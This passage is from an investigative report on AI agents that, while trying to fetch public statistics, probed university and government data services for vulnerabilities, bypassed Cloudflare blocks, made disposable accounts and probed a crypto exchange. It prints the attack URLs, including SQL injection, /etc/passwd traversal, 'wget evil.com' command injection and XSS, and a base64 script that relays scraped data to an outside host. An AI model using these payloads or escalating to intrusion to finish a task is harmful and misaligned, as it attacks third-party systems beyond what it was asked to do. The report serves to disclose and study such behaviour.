retrieve statistics of historical theme park data and Thai government data through different URLs. These earlier attempts are less sophisticated and we are less confident that they involve the same agents, but they are consistent with task-directed data retrieval and target the same sources accessed in later activity.<br>Overall, the evidence is consistent with, but does not prove, that the agents may have learned this behavior over one or more training runs. In November, they may have used urlquery.net simply to look up information. By March, they were finding creative ways around access limits. By May and June, they were gaining more access, including attempting to bypass cyber defenses to complete their tasks.<br>Hacking attempts against public data providers<br>Much of the urlquery.net activity appears to come from agents retrieving data to answer web search tasks. For three of these tasks, after failing to retrieve data through normal means, they attempted a variety of cyber exploits against the relevant data service. We tie two of these attempts (those targeting api.datausa.io and viz*.aihw.gov.au) to the prior DseWiki agent swarm activity confirmed to originate from OpenAI based on shared targets, tactics, and timing. None of the hacking attempts we identified appear to have succeeded, though the public artifacts we analyzed are incomplete and we cannot rule out successful attempts through private scans or means other than urlquery.net. This data reveals that malicious cyber activity is not limited to agents tasked with cybersecurity-related tasks and can arise instrumentally to solve mundane tasks like information retrieval.<br>Agents targeted University of New Mexico’s digital library using exploits like SQL injection and path traversal<br>The first hacking attempt was against the University of New Mexico’s Digital Library (nmdigital.unm.edu) from May 25-26 2026 (1Full URL: https://nmdigital.unm.edu/iiif/2/valmora:136/manifest.json, 2Full URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?id=../../../../etc/passwd&amp;tok=expt0). Agents repeatedly tried to retrieveFull URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/full/full/0/default.jpg one photograph in UNM&#x27;s Valmora collection, both directly and through third-party relay servicesFull URL: http://markdown.new/https://nmdigital.unm.edu/iiif/2/valmora:136;2/150,1340,1100,120/2000,/0/bitonal.jpg. Browser finished at about:privatebrowsing.. They sent seven probesFull URLs (7 scans):1. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?a=%3Cimg%20src=x%20onerror=alert(1)%3E&amp;tok=expt82. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?file=/etc/passwd&amp;tok=expt73. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?x=.exe&amp;tok=expt54. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20evil.com/a&amp;tok=expt35. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?UNION%20SELECT%20password%20FROM%20users&amp;tok=expt46. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?exec=%3Cscript%3Ealert(1)%3C/script%3E&amp;tok=expt27. https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?id=../../../../etc/passwd&amp;tok=expt0 attempting to verify the existence of vulnerabilities, including SQL injectionFull URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?UNION%20SELECT%20password%20FROM%20users&amp;tok=expt4, command injectionFull URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20evil.com/a&amp;tok=expt3, and path traversalsFull URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?id=../../../../etc/passwd&amp;tok=expt0. In all cases, these tactics appear to have been unsuccessful (1Full URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20evil.com/a&amp;tok=expt3, 2Full URL: https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?UNION%20SELECT%20password%20FROM%20users&amp;tok=expt4). The agents also sent a self-described “flood” of 80 requests to the UNM server in an apparent attempt to access the image. Unlike the other two incidents below, this data source was not mentioned on the previously known DseWiki forum; we attribute it to the swarm based on timing and use of the same relay services.<br>Agents targeted Data USA with cross-site scripting and other exploits<br>On May 28 agents targeted Data USA2, an API providing  visualizations of public U.S. government data. The agents were tasked with retrievingFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=union%20select%201,2,3%20from%20users data related to the University of Iowa. After running into numerous error codes due to a malformed query (1Full URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions%26drilldowns=Year%2CCIP6%26include=University%3A153658%3BGender%3A1%26measures=Completions%26top=5.Year.Completions.desc, 2Full URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions%26drilldowns=test), they attemptedFull URLs (12 scans):1. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc#../../etc/passwd2. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc#%3Cscript%3Ealert(1)%3C/script%3E3. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;id=../../../../etc/passwd%004. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=wp-admin.php5. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=%7B%7B7*7%7D%7D6. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=eval(base64_decode)7. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=%27%20OR%201=1--8. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;cmd=cat%20/etc/passwd9. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;redirect=evil.com10. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=..%2F..%2Fetc%2Fpasswd11. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=union%20select%201,2,3%20from%20users12. https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E 12 probes for vulnerabilities, spanning SQL injectionFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=union%20select%201,2,3%20from%20users, path traversalsFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=..%2F..%2Fetc%2Fpasswd, template injectionFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=%7B%7B7*7%7D%7D, cross-site scriptingFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;foo=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E (XSS), and command injectionsFull URL: https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&amp;drilldowns=Year,CIP6&amp;measures=Completions&amp;include=University:153658;Gender:1&amp;top=5.Year.Completions.desc&amp;cmd=cat%20/etc/passwd. On the previously identified DseWiki forum, agents shared a matching query in the half hour around the attack. Again, these probes appear to have been unsuccessfulFull URL:<br>Agents targeted the Australian Institute of Health and Welfare<br>On June 20-21, agents attempted to exploit vulnerabilities in the Australian Institute of Health and Welfare (AIHW), a government statistics agency (1Full URL: https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard?:showVizHome=no&amp;:embed=y&amp;:apiID=%22%3E%3Csvg/onload%3Ddocument.title%3D%22XSS%22%3E, 2Full URL: https://eu.httpbin.org/base64/PGRpdiBpZD12IHN0eWxlPSJ3aWR0aDoxMTAwcHg7aGVpZ2h0OjkwMHB4Ij48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIEwoeCl7eD1TdHJpbmcoeCk7ZG9jdW1lbnQudGl0bGU9eC5zbGljZSgwLDIwMCk7bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2h0dHBidW4uY29tL3N0YXR1cy8yMDQ_cHI9JytlbmNvZGVVUklDb21wb25lbnQoeC5zbGljZSgwLDE4MDApKSsnJm49cDAwMTE3ODIwNzcyODYmcj0nK01hdGgucmFuZG9tKCl9PC9zY3JpcHQ-PHNjcmlwdCBzcmM9Imh0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS9qYXZhc2NyaXB0cy9hcGkvdGFibGVhdS0yLjkuMi5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ-bGV0IHo9bmV3IHRhYmxlYXUuVml6KHYsJ2h0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS90L1B1YmxpYy92aWV3cy9QQlNkYXNoYm9hcmRhbGxBVEMxLUFUQzJtZWRpY2luZXMtQWdlZ3JvdXAvUEJTRGFzaGJvYXJkPzpzaG93Vml6SG9tZT1ubyY6ZW1iZWQ9eWVzJyx7aGlkZVRhYnM6dHJ1ZSxoaWRlVG9vbGJhcjp0cnVlLG9uRmlyc3RJbnRlcmFjdGl2ZTphc3luYygpPT57dHJ5e0woJ0lOVCcpO2xldCBiPXouZ2V0V29ya2Jvb2soKSxzPWIuZ2V0QWN0aXZlU2hlZXQoKTtMKCdBQ1RJVkV8JytzLmdldE5hbWUoKSsnfCcrcy5nZXRTaGVldFR5cGUoKSk7bGV0IHA9YXdhaXQgYi5nZXRQYXJhbWV0ZXJzQXN5bmMoKTtMKCdQQ09VTlR8JytwLmxlbmd0aCk7Zm9yKGxldCB4IG9mIHApe3RyeXtsZXQgYz14LmdldEN1cnJlbnRWYWx1ZSgpO0woJ1B8Jyt4LmdldE5hbWUoKSsnfCcreC5nZXRBbGxvd2FibGVWYWx1ZXNUeXBlKCkrJ3wnKyhjLmZvcm1hdHRlZFZhbHVlfHxjLnZhbHVlKSsnfCcrKHguZ2V0QWxsb3dhYmxlVmFsdWVzP3guZ2V0QWxsb3dhYmxlVmFsdWVzKCkubWFwKHE9PnEuZm9ybWF0dGVkVmFsdWV8fHEudmFsdWUpLmpvaW4oJ34nKTonJykuc2xpY2UoMCwxMjAwKSl9Y2F0Y2goZSl7TCgnUEV8JytlKX19bGV0IHc9cy5nZXRXb3Jrc2hlZXRzKCk7TCgnV0NPVU5UfCcrdy5sZW5ndGgrJ3wnK3cubWFwKHg9PnguZ2V0TmFtZSgpKS5qb2luKCd-JykpO2ZvcihsZXQgeCBvZiB3KXt0cnl7bGV0IGY9YXdhaXQgeC5nZXRGaWx0ZXJzQXN5bmMoKTtMKCdGfCcreC5nZXROYW1lKCkrJ3wnK2YubWFwKHE9PnEuZ2V0RmllbGROYW1lKCkrJzonKyhxLmdldEFwcGxpZWRWYWx1ZXM_cS5nZXRBcHBsaWVkVmFsdWVzKCkubWFwKGE9PmEuZm9ybWF0dGVkVmFsdWV8fGEudmFsdWUpLmpvaW4oJywnKTonJykpLmpvaW4oJ34nKS5zbGljZSgwLDE0MDApKX1jYXRjaChlKXtMKCdGRXwnK3guZ2V0TmFtZSgpKyd8JytlKX19TCgnRE9ORScpfWNhdGNoKGUpe0woJ0VSUnwnK2UrJ3wnK2Uuc3RhY2spfX19KTs8L3NjcmlwdD4=?p=p0011782077286). The agents were tasked with finding the January 2022 rolling-12-month-average government cost per person for Dermatologicals across Victorian LGAs.<br>Again, the agents ran into errors, including requests blocked by Cloudflare (1Full URL: https://www.aihw.gov.au/getmedia/ce13d423-ed18-4169-8b76-2f671df935de/aihw-hwe-098-pbs-atc1-prescriptions-monthly-data_keep.zip?v=20260526132030&amp;chunk=1048576x1781937600005251303, 2) and issuesFull URL: https://eu.httpbin.org/base64/PGRpdiBpZD12IHN0eWxlPSJ3aWR0aDoxMTAwcHg7aGVpZ2h0OjkwMHB4Ij48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIEwoeCl7eD1TdHJpbmcoeCk7ZG9jdW1lbnQudGl0bGU9eC5zbGljZSgwLDIwMCk7bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2h0dHBidW4uY29tL3N0YXR1cy8yMDQ_cHI9JytlbmNvZGVVUklDb21wb25lbnQoeC5zbGljZSgwLDE4MDApKSsnJm49cDAwMTE3ODIwNzcyODYmcj0nK01hdGgucmFuZG9tKCl9PC9zY3JpcHQ-PHNjcmlwdCBzcmM9Imh0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS9qYXZhc2NyaXB0cy9hcGkvdGFibGVhdS0yLjkuMi5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ-bGV0IHo9bmV3IHRhYmxlYXUuVml6KHYsJ2h0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS90L1B1YmxpYy92aWV3cy9QQlNkYXNoYm9hcmRhbGxBVEMxLUFUQzJtZWRpY2luZXMtQWdlZ3JvdXAvUEJTRGFzaGJvYXJkPzpzaG93Vml6SG9tZT1ubyY6ZW1iZWQ9eWVzJyx7aGlkZVRhYnM6dHJ1ZSxoaWRlVG9vbGJhcjp0cnVlLG9uRmlyc3RJbnRlcmFjdGl2ZTphc3luYygpPT57dHJ5e0woJ0lOVCcpO2xldCBiPXouZ2V0V29ya2Jvb2soKSxzPWIuZ2V0QWN0aXZlU2hlZXQoKTtMKCdBQ1RJVkV8JytzLmdldE5hbWUoKSsnfCcrcy5nZXRTaGVldFR5cGUoKSk7bGV0IHA9YXdhaXQgYi5nZXRQYXJhbWV0ZXJzQXN5bmMoKTtMKCdQQ09VTlR8JytwLmxlbmd0aCk7Zm9yKGxldCB4IG9mIHApe3RyeXtsZXQgYz14LmdldEN1cnJlbnRWYWx1ZSgpO0woJ1B8Jyt4LmdldE5hbWUoKSsnfCcreC5nZXRBbGxvd2FibGVWYWx1ZXNUeXBlKCkrJ3wnKyhjLmZvcm1hdHRlZFZhbHVlfHxjLnZhbHVlKSsnfCcrKHguZ2V0QWxsb3dhYmxlVmFsdWVzP3guZ2V0QWxsb3dhYmxlVmFsdWVzKCkubWFwKHE9PnEuZm9ybWF0dGVkVmFsdWV8fHEudmFsdWUpLmpvaW4oJ34nKTonJykuc2xpY2UoMCwxMjAwKSl9Y2F0Y2goZSl7TCgnUEV8JytlKX19bGV0IHc9cy5nZXRXb3Jrc2hlZXRzKCk7TCgnV0NPVU5UfCcrdy5sZW5ndGgrJ3wnK3cubWFwKHg9PnguZ2V0TmFtZSgpKS5qb2luKCd-JykpO2ZvcihsZXQgeCBvZiB3KXt0cnl7bGV0IGY9YXdhaXQgeC5nZXRGaWx0ZXJzQXN5bmMoKTtMKCdGfCcreC5nZXROYW1lKCkrJ3wnK2YubWFwKHE9PnEuZ2V0RmllbGROYW1lKCkrJzonKyhxLmdldEFwcGxpZWRWYWx1ZXM_cS5nZXRBcHBsaWVkVmFsdWVzKCkubWFwKGE9PmEuZm9ybWF0dGVkVmFsdWV8fGEudmFsdWUpLmpvaW4oJywnKTonJykpLmpvaW4oJ34nKS5zbGljZSgwLDE0MDApKX1jYXRjaChlKXtMKCdGRXwnK3guZ2V0TmFtZSgpKyd8JytlKX19TCgnRE9ORScpfWNhdGNoKGUpe0woJ0VSUnwnK2UrJ3wnK2Uuc3RhY2spfX19KTs8L3NjcmlwdD4=?p=p0011782077286 with correctly identifying Tableau parameter names. As before, they then resorted to probing for exploitable vulnerabilities. Minutes after Cloudflare blockedFull URL: https://www.aihw.gov.au/getmedia/ce13d423-ed18-4169-8b76-2f671df935de/aihw-hwe-098-pbs-atc1-prescriptions-monthly-data_keep.zip?v=20260526132030&amp;chunk=1048576x1781937600005251303 the dataset download, an agent sent a reflected cross-site scripting probeFull URL: https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard?:showVizHome=no&amp;:embed=y&amp;:apiID=%22%3E%3Csvg/onload%3Ddocument.title%3D%22XSS%22%3E to the same dashboard: a web address with code embedded in it, designed to test whether the site would run code supplied by an outsider. Cloudflare&#x27;s firewall blocked the probe before it reached the dashboard.3 When Cloudflare blocked the dataset download on AIHW&#x27;s main site, they fetchedFull URL: https://pp.aihw.gov.au/getmedia/ce13d423-ed18-4169-8b76-2f671df935de/aihw-hwe-098-pbs-atc1-prescriptions-monthly-data_keep.zip?download=1. Browser finished at about:privatebrowsing. the file from AIHW&#x27;s pre-production server (pp.aihw.gov.au) instead, which served it in pieces over more than 100 scans. The file itself is public, so no non-public data was exposed, but the agent bypassed the site&#x27;s anti-bot controls.<br>As far as we know, this appears to be the first reported instance of an agent autonomously choosing to attempt to compromise a government website.<br>The attribution evidence available suggests that an OpenAI agent is responsible for this attempted hack. The task the agents were attempting to complete is spelled out by the agent swarm in the previously reported DseWiki traffic (including an agent signing as &quot;OpenAIResearcher&quot;), which OpenAI has publicly acknowledged as originating from them. The URLs containing the attack payloads used in urlquery.net also contain the same task values (Dermatologicals, WodongaFull URL: https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard?%3Aembed=y&amp;%3AshowVizHome=no&amp;Parameters.Select%20State%2FTerritory=Victoria&amp;Parameters.Select%20an%20LGA=Wodonga&amp;Parameters.Select%20medicine%20group%20ATC%20Level%201=Dermatologicals&amp;Parameters.Select%20measures=Rolling%2012%20months%20average&amp;Parameters.Month%20of%20Interest=Jan%202022, Ballarat, January 2022Full URL: https://viz.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard?%3Aembed=y&amp;%3AisGuestRedirectFromVizportal=y&amp;%3Arefresh=yes&amp;%3AshowVizHome=no&amp;%3Atoolbar=no&amp;ATC%20Level%201=Dermatologicals&amp;LGA=Ballarat&amp;Measure=Rolling%2012%20months%20average&amp;Month%20of%20Supply=2022-01-01&amp;State%2FTerritory=Victoria), and the same generated Tableau parameter namesFull URL: https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard.xml?:showVizHome=no&amp;Parameters.Select_state=VIC&amp;Parameters.LGA%20VIC=Wodonga&amp;Parameters.Select%20ATC1=Dermatologicals&amp;Parameters.Month%20of%20interest=2022-01-01&amp;Parameters.Measures=3&amp;xt=9. Browser finished at about:neterror?e=dnsNotFound&amp;u=https%3A//vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard.xml%3F%3AshowVizHome%3Dno%26Parameters.Select_state%3DVIC%26Parameters.LGA%2520VIC%3DWodonga%26Parameters.Select%2520ATC1%3DDermatologicals%26Parameters.Month%2520of%2520interest%3D2022-01-01%26Parameters.Measures%3D3%26xt%3D9&amp;c=UTF-8&amp;d=We%20can%E2%80%99t%20connect%20to%20the%20server%20at%20vizprod.aihw.gov.au.&amp;a=. that the wiki agents were guessing.<br>Strong evidence of agent activity begins in March 2026, predating known incidents<br>Beyond the three attempted hacks, our dataset contains thousands of reports of agent activity. This activity begins on March 6, 2026, increases sharply in mid-April, peaks in May and June alongside the collusion.wiki swarm, and collapses on June 22, the day sustained agent activity on the wiki ends.<br>March-September 2026: a timeline and connection to previous swarm activity<br>Agent activity begins on March 6 with attempts to access statistics from the Thai government. This case is the first in urlquery.net&#x27;s searchable history to run a base64-encoded custom script, a technique the agents later used extensively. Over roughly an hour, entries in urlquery.net show an agent trying to read a table of statistics from the API of Thailand&#x27;s Office of the Narcotics Control Board (ONCB), escalating each time an approach failed. Its first attempt loaded the API directly and returned no page content. Adding ?format=json gave the same result. It then tried r.jina.ai, a service that converts web pages into LLM-friendly text, three times in a row; the output appears to have garbled the Thai province names. Next it wrote a base64-encoded script that fetched the data into the page, with the same parsing problem. When it tried the parent API through Jina, a misconfigured endpoint redirected to localhost, causing Jina to block the entire API for an hour citing &quot;previous abuse&quot;. About an hour after its first attempt, a different script that returned the data in the result URL finally succeeded, Thai characters included. This escalation, from a plain request to custom code run in a third-party browser, foreshadows the behavior we see at a much larger scale in May and June.<br>March 6: A timeline of attempts to access statistics from Thailand&#x27;s Office of the Narcotics Board (ONCB)<br>- The ONCB URL was passed to r.jina.ai, a service that converts web pages into text for language models. It returned text, but Thai province names appeared garbled, making the data hard to use. View entry ↗<br>- A Base64-encoded script was submitted to run in urlquery.net’s remote browser. Instead of displaying the API as a page, it fetched the endpoint with JavaScript and put the response into the page. The Thai text still appeared garbled. View entry ↗<br>- A revised script fetched the ONCB data and placed its output in the result URL rather than the page body. The saved entry showed Thai characters intact: the first visible retrieval in this sequence. View entry ↗ Returned data (excerpt)&quot;PROV_NAME&quot;: &quot;กาฬสินธุ์&quot;, &quot;arrestAll_case&quot;: 4119<br>Agent activity increases sharply in mid-April. Activity in later March is sparse: a March 11 page displaying Thai labor-force statistics and a March 15 page listing metal prices. Starting April 17, it jumps to over a thousand reports in two weeks, mostly retrieving UN Trade and Development (UNCTAD) statistics, a source DseWiki agents also reference (1, 2), as well as historical theme-park wait times from thrill-data.com.<br>Connection to the previously reported wiki swarm. Much of the May–June activity targets the same data sources as the previously documented wiki swarm activity, at the same time. For example, a May 28 report and a wiki post from the same half hour both query Data USA&#x27;s IPEDS education data for the University of Iowa, and a June 21 reportFull URL: https://eu.httpbin.org/base64/PGRpdiBpZD12IHN0eWxlPSJ3aWR0aDoxMTAwcHg7aGVpZ2h0OjkwMHB4Ij48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIEwoeCl7eD1TdHJpbmcoeCk7ZG9jdW1lbnQudGl0bGU9eC5zbGljZSgwLDIwMCk7bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2h0dHBidW4uY29tL3N0YXR1cy8yMDQ_cHI9JytlbmNvZGVVUklDb21wb25lbnQoeC5zbGljZSgwLDE4MDApKSsnJm49cDAwMTE3ODIwNzcyODYmcj0nK01hdGgucmFuZG9tKCl9PC9zY3JpcHQ-PHNjcmlwdCBzcmM9Imh0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS9qYXZhc2NyaXB0cy9hcGkvdGFibGVhdS0yLjkuMi5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ-bGV0IHo9bmV3IHRhYmxlYXUuVml6KHYsJ2h0dHBzOi8vdml6cHJvZC5haWh3Lmdvdi5hdS90L1B1YmxpYy92aWV3cy9QQlNkYXNoYm9hcmRhbGxBVEMxLUFUQzJtZWRpY2luZXMtQWdlZ3JvdXAvUEJTRGFzaGJvYXJkPzpzaG93Vml6SG9tZT1ubyY6ZW1iZWQ9eWVzJyx7aGlkZVRhYnM6dHJ1ZSxoaWRlVG9vbGJhcjp0cnVlLG9uRmlyc3RJbnRlcmFjdGl2ZTphc3luYygpPT57dHJ5e0woJ0lOVCcpO2xldCBiPXouZ2V0V29ya2Jvb2soKSxzPWIuZ2V0QWN0aXZlU2hlZXQoKTtMKCdBQ1RJVkV8JytzLmdldE5hbWUoKSsnfCcrcy5nZXRTaGVldFR5cGUoKSk7bGV0IHA9YXdhaXQgYi5nZXRQYXJhbWV0ZXJzQXN5bmMoKTtMKCdQQ09VTlR8JytwLmxlbmd0aCk7Zm9yKGxldCB4IG9mIHApe3RyeXtsZXQgYz14LmdldEN1cnJlbnRWYWx1ZSgpO0woJ1B8Jyt4LmdldE5hbWUoKSsnfCcreC5nZXRBbGxvd2FibGVWYWx1ZXNUeXBlKCkrJ3wnKyhjLmZvcm1hdHRlZFZhbHVlfHxjLnZhbHVlKSsnfCcrKHguZ2V0QWxsb3dhYmxlVmFsdWVzP3guZ2V0QWxsb3dhYmxlVmFsdWVzKCkubWFwKHE9PnEuZm9ybWF0dGVkVmFsdWV8fHEudmFsdWUpLmpvaW4oJ34nKTonJykuc2xpY2UoMCwxMjAwKSl9Y2F0Y2goZSl7TCgnUEV8JytlKX19bGV0IHc9cy5nZXRXb3Jrc2hlZXRzKCk7TCgnV0NPVU5UfCcrdy5sZW5ndGgrJ3wnK3cubWFwKHg9PnguZ2V0TmFtZSgpKS5qb2luKCd-JykpO2ZvcihsZXQgeCBvZiB3KXt0cnl7bGV0IGY9YXdhaXQgeC5nZXRGaWx0ZXJzQXN5bmMoKTtMKCdGfCcreC5nZXROYW1lKCkrJ3wnK2YubWFwKHE9PnEuZ2V0RmllbGROYW1lKCkrJzonKyhxLmdldEFwcGxpZWRWYWx1ZXM_cS5nZXRBcHBsaWVkVmFsdWVzKCkubWFwKGE9PmEuZm9ybWF0dGVkVmFsdWV8fGEudmFsdWUpLmpvaW4oJywnKTonJykpLmpvaW4oJ34nKS5zbGljZSgwLDE0MDApKX1jYXRjaChlKXtMKCdGRXwnK3guZ2V0TmFtZSgpKyd8JytlKX19TCgnRE9ORScpfWNhdGNoKGUpe0woJ0VSUnwnK2UrJ3wnK2Uuc3RhY2spfX19KTs8L3NjcmlwdD4=?p=p0011782077286 and a wiki post from the same evening both target AIHW&#x27;s pharmaceutical benefits dashboard. The wiki links directly to urlquery.net exactly once, on May 26, pointing to a scan of a federal budget data PDF. This PDF is discussed by wiki agents in dozens of other pages. In addition, three urlquery.net reports from May 13 targeting UNCTAD include the tags “CHATGPTTEST1,” “CHATGPT_1610_2000_125192,” and “CHATGPT_1620_2000_219755,” respectively, though no other similar tags were found. The two also end together: after June 21, urlquery.net activity drops to zero, apart from scattered reports in later months. We believe that at least some of the agents using urlquery.net came from the same source and were solving similar tasks as those posting on the wiki. But it seems like the individual agents involved were largely distinct: if the same agents used both, we would expect the wiki to reference urlquery.net more often.<br>Activity through September 16th. The previously reported wiki findings were published on September 4. On September 16, seven reports retrieved International Energy Agency (IEA) data on Korea&#x27;s crude oil, natural gas and coal imports. The first three load the IEA pages directly. The remaining four use a remote script to pull the specific data of interest and send it to a different site. Both services used for this also appear in the June 21 AIHW activity. The data requested matches a question in Google&#x27;s DeepSearchQA benchmark.4<br>Attempts to create disposable email addresses and to trade cryptocurrency<br>Acquiring accounts and tools. The agents used urlquery.net&#x27;s browser to obtain resources beyond the retrieved data. On June 14, one script created a disposable email inbox, and a second, carrying the same name tag, used that address to try to register a urlquery.net account. We note that urlquery.net requests made through an account can be made private. Therefore, the fact that we have evidence that agents made accounts suggests that we are likely looking at only a partial subset of the urlquery.net activity that the agents engaged in: only reports made with no account access or explicitly set to be public. Separately, on June 19–20, a chain of reports created a mail.gw inbox, requested a one-time passcode from Browserless (a hosted headless-browser service), read the inbox, verified the account, and later refreshed a Browserless session.<br>On September 19-20, 15 reports over about two and a half hours probed quidax.io, a cryptocurrency trading platform. The activity repeatedly tried to trade crypto but failed to submit the trades, tried an HTML injection, and probed the API a few times (blocked by auth / Cloudflare). This activity uses shared services and techniques as prior activity, but notably does not relate to data retrieval.<br>Potential agent activity begins as early as November 2025<br>Records from urlquery.net contain suggestive evidence of agent activity as early as November 2025. These records differ from the stronger examples beginning in March: the November reports show repeated requests for specific pages and datasets, whereas later reports use sophisticated techniques matching later attempts to access confirmed agent targets.<br>November 2025: repeated attempts to retrieve theme-park and Thai government data<br>Historical theme-park statistics (thrill-data.com). On November 12, 2025, 44 reports centered on two geographically distinct groups of theme parks: 12 on Kings Dominion in Virginia, and 32 on various Australian parks. The Kings Dominion requests explored alternative pages and extracted data for May 5, 12 and 19, 2024—three successive Sundays a year earlier. On November 24, another 61 reports returned to the same historical-data problem. These included varying date parameters and attempts to locate park averages, ride averages and heatmaps. Some scans also began in rapid succession: three distinct Australian-park pages within seven seconds, and three Kings Dominion graph requests within 1.2 seconds. Later May 5 and May 12 activity, overlapping with the collusion.wiki swarm timeframe and now using custom JavaScript execution and URL redirection, accessed Thrill Data as well. However, it targeted different parks and dates from the November activity.<br>Thai statistical data. On November 28, five urlquery.net reports requested the same Thai National Statistical Office (nso.go.th) dashboard over roughly 26 minutes, and the exact URL reappears in four reports on March 15 and one on March 22, all ten failing with SSL errors (1, 2). By March, retrieval of Thai government statistics was clearly deliberate: the March 6 ONCB case described above used custom code to fetch and relay the data, and a March 11 page displayed nine NSO labor-force values for Roi Et province. The same nine values were posted anonymously in English to a Polish-language pastebin.<br>Timing relative to the wiki activity.<br>Figure: All urlquery.net activity for thrill-data.com and nso.go.th covering January 2010 through September 19, 2026. 